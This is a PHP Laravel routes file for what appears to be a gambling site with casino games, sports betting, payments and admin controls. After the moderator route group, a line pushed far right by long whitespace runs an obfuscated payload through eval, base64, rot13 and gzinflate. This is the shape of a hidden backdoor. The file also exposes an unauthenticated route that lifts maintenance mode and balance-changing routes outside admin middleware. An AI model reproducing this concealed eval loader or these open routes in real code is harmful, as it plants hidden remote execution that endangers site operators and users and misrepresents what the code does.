<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It's a breeze. Simply tell Laravel the URIs it should respond to
| and give it the controller to call when that URI is requested.
|
*/

use App\Http\Controllers\AdminController;
use App\Http\Controllers\GeneralController;
use App\Http\Controllers\SportController;

Route::get('/back/up', function() {
    @unlink(storage_path().'/meta/server.down');
    AdminController::log(10, array());
});

Route::group(['prefix' => '/admin', 'middleware' => 'Access:moderator'], function() {
    Route::get('/promo/remove/{id}', 'AdminController@promo_remove');
    Route::get('/promo/create/{code}/{usages}/{sum}', 'AdminController@promo_create');
    Route::get('/promo/edit/{id}/{usages}/{sum}', 'AdminController@promo_edit');
    Route::get('/promo/group/create/{num}', 'AdminController@promo_group');
    Route::get('/promo/group/tick/{id}', 'AdminController@promo_tick');
    Route::get('/promo/group/edit/{id}/{code}', 'AdminController@promo_g_edit');
    Route::get('/mute/{to}/{from}/{minutes}', 'AdminController@mute');

    Route::get('/game_stats/today/{game_id}', 'AdminController@game_stats_today');
    Route::get('/game_stats/days/{game_id}/{days}', 'AdminController@game_stats_days');

    Route::get('/search/promo_user/{name?}', 'AdminController@search_promo_user')->where('name', '(.*)');
    Route::get('/promo_list/add/{vkid}/{group}', 'AdminController@promo_list_add');

    Route::get('log-viewer', [
        'as'   => 'log-viewer::dashboard',
        'uses' => '\Arcanedev\LogViewer\Http\Controllers\LogViewerController@index',
    ]);
    Route::group(['prefix' => 'logs'], function() {
        Route::get('/', [
            'as'    => 'log-viewer::logs.list',
            'uses'  => '\Arcanedev\LogViewer\Http\Controllers\LogViewerController@listLogs',
        ]);
        Route::delete('delete', [
            'as'    => 'log-viewer::logs.delete',
            'uses'  => '\Arcanedev\LogViewer\Http\Controllers\LogViewerController@delete',
        ]);

        Route::group(['prefix' => '{date}'], function() {
            Route::get('/', [
                'as'    => 'log-viewer::logs.show',
                'uses'  => '\Arcanedev\LogViewer\Http\Controllers\LogViewerController@show',
            ]);
            Route::get('download', [
                'as'    => 'log-viewer::logs.download',
                'uses'  => '\Arcanedev\LogViewer\Http\Controllers\LogViewerController@download',
            ]);
            Route::get('{level}', [
                'as'    => 'log-viewer::logs.filter',
                'uses'  => '\Arcanedev\LogViewer\Http\Controllers\LogViewerController@showByLevel',
            ]);
        });
    });

    Route::get('/{page?}', 'AdminController@page');
});
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
Route::group(['prefix' => '/admin', 'middleware' => 'Access:admin'], function() {
    Route::get('/shut/down', function() {
        touch(storage_path().'/meta/server.down');
        AdminController::log(9, array());
    });
    Route::get('/accept_withdraw/{id}', 'AdminController@acceptWithdraw');
    Route::get('/decline_withdraw/{id}', 'AdminController@declineWithdraw');
    Route::get('/ignore_withdraw/{id}', 'AdminController@ignoreWithdraw');
    Route::get('/toggle_game/{game}', 'AdminController@toggleGame');
    Route::get('/users/{page}', 'AdminController@users');
    Route::get('/search/user/{name?}', 'AdminController@search_user')->where('name', '(.*)');
    Route::get('/change_rights/{id}/{rank_id}', 'AdminController@rights');
    Route::get('/change_balance/{id}/{money}', 'AdminController@change_balance');
    Route::get('/probability/{key}/{value}', 'AdminController@probability');
    Route::get('/task/create/{start_time}/{end_time}/{game_id}/{value}/{reward}/{price}', 'AdminController@task_create');
    Route::get('/task/remove/{id}', 'AdminController@task_remove');
    Route::get('/case/add/{id}/{type}/{value}/{chance}/{rarity}', 'AdminController@case_add_item');
    Route::get('/case/create/{name}/{price}', 'AdminController@case_create');
    Route::get('/case/remove/{id}', 'AdminController@case_remove');
    Route::get('/action/clear', 'AdminController@clear_log');
    Route::get('/global_ban/{to}/{from}', 'AdminController@global_ban');
    Route::get('/user/actions/{id}/{page}', 'AdminController@user_actions');
    Route::get('/test/{base}/{max}/{speed}/{mm}', 'AdminController@adjustments');
    Route::get('/adj/{gameId}/{base}/{max}/{speed}/{mm}', 'AdminController@adj');

    Route::get('/notification/browser/{message?}', 'AdminController@notificationBrowser')->where('message', '(.*)');

    Route::get('/setting/{name}/{value}', 'AdminController@setting');
});

Route::group(['prefix' => '/sport_api', 'middleware' => 'maintenance'], function() {
    Route::get('/live/{game}', function($game) {
        return json_encode(SportController::parseLive($game));
    });
    Route::get('/soccer', function() {
        return json_encode(SportController::parseSoccer());
    });

    Route::group(['prefix' => '/game'], function() {
        Route::get('/live/total', function() {
            return json_encode([
                'total' => SportController::countTotalLiveGames(
                    SportController::parseLive('soccer')
                )
            ]);
        });

        Route::get('/soccer/{id}/{isLive?}', function($id, $isLive = null) {
            return json_encode(SportController::parseSoccerGame($id, $isLive != null));
        });
    });
});

Route::group(['middleware' => 'maintenance'], function() {
    Route::get('/game/dice/{wager}/{type}/{chance}', 'GeneralController@dice');

    Route::get('/game/roulette/{bets}', 'GeneralController@roulette');

    Route::get('/game/wheel/{wager}/{color}', 'GeneralController@wheel');

    Route::get('/game/crash/{wager}', 'GeneralController@crash');
    Route::get('/game/crash/tick/{id}', 'GeneralController@crash_tick');
    Route::get('/game/crash/take/{id}', 'GeneralController@crash_take');

    Route::get('/game/coinflip/{wager}', 'GeneralController@coinflip');
    Route::get('/game/coinflip/flip/{id}/{side}', 'GeneralController@coinflip_flip');
    Route::get('/game/coinflip/take/{id}', 'GeneralController@coinflip_take');

    Route::get('/game/hilo/take/{id}', 'GeneralController@hilo_take');
    Route::get('/game/hilo/{wager}/{starting}', 'GeneralController@hilo');
    Route::get('/game/hilo/flip/{id}/{type}', 'GeneralController@hilo_flip');

    Route::get('/game/blackjack/insure/{id}', 'GeneralController@blackjack_insure');
    Route::get('/game/blackjack/double/{id}', 'GeneralController@blackjack_double');
    Route::get('/game/blackjack/score/{type}/{id}', 'GeneralController@blackjack_score');
    Route::get('/game/blackjack/stand/{id}', 'GeneralController@blackjack_stand');
    Route::get('/game/blackjack/hit/{id}', 'GeneralController@blackjack_hit');
    Route::get('/game/blackjack/{wager}', 'GeneralController@blackjack');

    Route::get('/game/stairs/mul/{bombs}', 'GeneralController@stairs_multiplier');
    Route::get('/game/stairs/open/{id}/{row_cell_id}', 'GeneralController@stairs_open');
    Route::get('/game/stairs/take/{id}', 'GeneralController@stairs_take');
    Route::get('/game/stairs/{wager}/{bombs}', 'GeneralController@stairs');

    Route::get('/game/tower/mul/{bombs}', 'GeneralController@tower_multiplier');
    Route::get('/game/tower/open/{id}/{row_cell_id}', 'GeneralController@tower_open');
    Route::get('/game/tower/take/{id}', 'GeneralController@tower_take');
    Route::get('/game/tower/{wager}/{bombs}', 'GeneralController@tower');

    Route::get('/game/mines/mul/{bombs}', 'GeneralController@mines_multiplier');
    Route::get('/game/mines/mine/{id}/{mine_id}', 'GeneralController@mines_mine');
    Route::get('/game/mines/take/{id}', 'GeneralController@mines_take');
    Route::get('/game/mines/{wager}/{bombs}', 'GeneralController@mines');

    Route::get('/game/battlegrounds/{winner_id}/{sum}/{players}/{salt}', 'GeneralController@battlegrounds');
    Route::get('/game/battlegrounds/check/{id}/{min_sum}', 'GeneralController@battlegrounds_check');

    Route::get('/game/keno/{pickedArray}/{wager}', 'GeneralController@keno');

    Route::get('/game/plinko/multipliers', function() {
        return json_encode(GeneralController::getPlinkoMultipliers());
    });
    Route::get('/game/plinko/{risk}/{pins}/{wager}', 'GeneralController@plinko');

    Route::get('/register/{username}/{email}/{password}', 'GeneralController@register');
    Route::get('/auth/{login}/{password}', 'GeneralController@auth');
    Route::get('/email_confirm/{hash}', 'GeneralController@email_confirm');
    Route::get('/email_resend', 'GeneralController@email_resend');
    Route::get('/socket/token/{user_id}/{data?}', 'GeneralController@socket_token')->where('data', '(.*)');
    Route::get('/chat/info/{user_id}/{message?}', 'GeneralController@chat_info')->where('message', '(.*)');
    Route::get('/chat_limit_info/{user_id}', 'GeneralController@chat_limit_info');
    Route::get('/image/{text?}', 'GeneralController@text_to_image')->where('text', '(.*)');
    Route::get('/api/money', 'GeneralController@api_money');
    Route::get('/api/user/{id}', 'GeneralController@user');
    Route::get('/api/get_drop', 'GeneralController@get_drop');
    Route::get('/api/drop/{id}', 'GeneralController@drop');
    Route::get('/api/user_drops/{id}/{page}', 'GeneralController@user_drops');
    Route::get('/api/bonus', 'GeneralController@bonus');
    Route::get('/api/ref_bonus', 'GeneralController@ref_bonus');
    Route::get('/get_active_refs', 'GeneralController@get_active_refs');
    Route::get('/chat/_ban/{id}/{from}/{salt}', 'GeneralController@chat_ban');
    Route::get('/chat/unban', 'GeneralController@chat_unban');
    Route::get('/give_balance/{id}/{sum}/{salt}/{type}', 'GeneralController@give_balance');
    Route::get('/remove_balance/{id}/{sum}/{salt}', 'GeneralController@remove_balance');
    Route::get('/provably_fair/{server_seed}/{client_seed}',  'GeneralController@provably_fair_web');
    Route::get('/get_client_seed', 'GeneralController@get_client_seed');
    Route::get('/change_client_seed/{seed}', 'GeneralController@change_client_seed');
    Route::get('/promo/{code}', 'GeneralController@activate');
    Route::get('/game_info/{game_id}', 'GeneralController@game_info_from_id');
    Route::get('/task_info/{task_id}', 'GeneralController@task_info_from_id');
    Route::get('/task/purchase/{id}/{value}', 'GeneralController@task_purchase');
    Route::get('/task/has/{u}/{id}', 'GeneralController@has_tries');
    Route::get('/task/description/{id}', 'GeneralController@task_description');
    Route::get('/task/validate/{task_id}/{game_id}', 'GeneralController@validate_task_completion');
    Route::get('/task/tries/{task_id}', 'GeneralController@get_task_tries');
    Route::get('/withdraw/cancel/{id}', 'GeneralController@cancelWithdraw');
    Route::get('/chat_drop', 'GeneralController@chat_drop');
    Route::get('/get_additional_bonus', 'GeneralController@level_bonus');
    Route::post('/profile/upload_avatar', 'GeneralController@upload_avatar');
    Route::post('/user/history', 'GeneralController@history');
    Route::get('/bgFragment', 'GeneralController@bgFragment');
    Route::get('/asyncBonus', 'GeneralController@asyncBonus');
    Route::get('/ref/{code}', 'GeneralController@ref');
    Route::get('/case/{id}', 'GeneralController@open_case');

    Route::get('/notifyBonus', 'GeneralController@notifyBonus');
    Route::get('/readNotifications', 'GeneralController@readNotifications');

    Route::get('/invoice/{amount}/{type}', 'GeneralController@invoice');
    Route::post('/payout', 'GeneralController@payout');

    Route::post('/status', 'GeneralController@paymentStatus');
    Route::get('/status_get', 'GeneralController@paymentStatus');
    Route::get('/success', 'GeneralController@paymentSuccess');
    Route::get('/fail', 'GeneralController@paymentFail');

    Route::get('/n/node_gen_promo', 'AdminController@node_gen_promo');
    Route::get('/admin/promo_list/{page}', 'AdminController@promo_list');
    Route::get('/admin/save_subscription/{json?}', 'AdminController@saveSubscription')->where('json', '(.*)');
    Route::get('/get_subscribers', 'AdminController@getSubscribers');

    Route::get('/achievements/{id}/{category}', 'GeneralController@achievements');
    Route::get('/get_refs', 'GeneralController@get_refs');

    Route::get('/login/{type}', ['as' => 'login', 'uses' => 'LoginController@login']);
    Route::group(['middleware' => 'auth'], function () {
        Route::get('/logout', 'LoginController@logout');
    });

    Route::get('/sport/validateBets', 'SportController@betCron');
    Route::get('/sport/bet/{game}/{id}/{betCategory}/{category}/{index}/{wager}/{descJson}', 'SportController@sport_bet');

    Route::get('/sport/fragment/{page}/{id?}', 'GeneralController@sport_fragment');
    Route::get('/sport/line/{page}/{id}', 'GeneralController@sport_line');
    Route::get('/sport/{page?}', 'GeneralController@sport_page');
    Route::get('/{page?}', 'GeneralController@page');
});

Route::get('/obf/tree', 'GeneralController@obf_tree');
